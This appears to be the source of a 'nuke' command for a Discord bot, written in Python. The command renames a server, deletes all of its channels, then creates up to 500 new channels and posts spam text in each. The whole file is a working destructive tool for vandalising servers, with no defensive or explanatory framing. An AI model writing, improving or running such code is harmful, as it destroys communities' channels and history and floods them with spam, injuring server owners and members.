from Libs import toggles,config
from Backbone import discord
import time

async def chspam(guild):
  channelcount=len(guild.text_channels)
  while (toggles.nuke and (channelcount < 500)):
    channelcount+=1
    await (await guild.create_text_channel(toggles.nukechname)).send(toggles.nuketext)

def help():
  return "Nuke server"
async def exec(req):
  if toggles.nuketext == None or (req.guild == None and toggles.nukeserverid == None) or toggles.nukechname == None or toggles.nuketitle == None:
    await req.reply("Variables not set. Make sure to set nuketext,nukechname and nuketitle with " + config.prefix + "set. Additionally, set nukeserverid or run this command in a guild." )
    return
  if toggles.nukeserverid == None:
    toggles.nukeserverid = req.guild.id
  await req.delete()
  toggles.nuke = True
  await req.embed("Starting nuke (stop it by using " + config.prefix  +"set nuke false)")
  req.guild.edit(name=toggles.nuketitle)
  for channel in req.guild.channels:
    try:
      await channel.delete()
      time.sleep(0.1)
    except:
        pass
  await chspam(req.guild)
    
